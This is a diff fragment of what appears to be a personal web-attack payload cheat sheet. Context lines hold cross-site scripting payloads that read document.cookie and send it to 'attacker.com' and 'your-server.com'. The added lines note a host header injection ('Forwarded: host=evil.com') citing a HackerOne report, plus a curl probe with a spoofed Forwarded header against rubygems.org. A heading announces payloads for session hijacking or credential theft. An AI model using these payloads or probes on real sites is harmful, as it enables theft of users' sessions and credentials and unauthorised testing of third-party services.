@@ -70,8 +70,15 @@ SEND DATA YOUR TO YOUR SERVER:
 	<svg onload="(new Image).src='https://your-server.com/log?'+document.cookie">
         <script>fetch('https://attacker.com/c='+document.cookie)</script>
 
-chain xss and htmli
 
+HOST HEADER ATTACK
+font: https://hackerone.com/reports/2627221
+|_ Forwarded: host=evil.com
+
+test PoC
+|_curl -v -H "Forwarded: host=pup-e.com" https://rubygems.org
+
+chain xss and htmli
 
 Create an Advanced Payload for Session Hijacking or Credential Theft:
 
